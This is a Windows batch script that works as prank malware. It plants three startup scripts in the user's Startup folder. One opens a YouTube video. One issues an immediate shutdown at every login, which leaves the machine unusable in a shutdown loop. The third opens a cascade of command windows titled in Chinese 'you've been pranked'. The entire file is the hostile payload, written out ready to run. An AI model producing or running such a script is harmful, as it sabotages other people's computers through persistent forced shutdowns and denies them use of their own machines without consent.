@echo off

echo start https://www.youtube.com/shorts/Pfvg1jRXnZ4 > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Rick.bat"

echo shutdown -s -t 1 > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Shut.bat"

echo chcp 65001 > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Stuck.bat"
echo cd ..\..\..\..\..\..\..\..\.. >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Stuck.bat"
echo start >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Stuck.bat"
echo for /l %%%%a in (1,1,10) do (start "你被耍了") >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Stuck.bat"
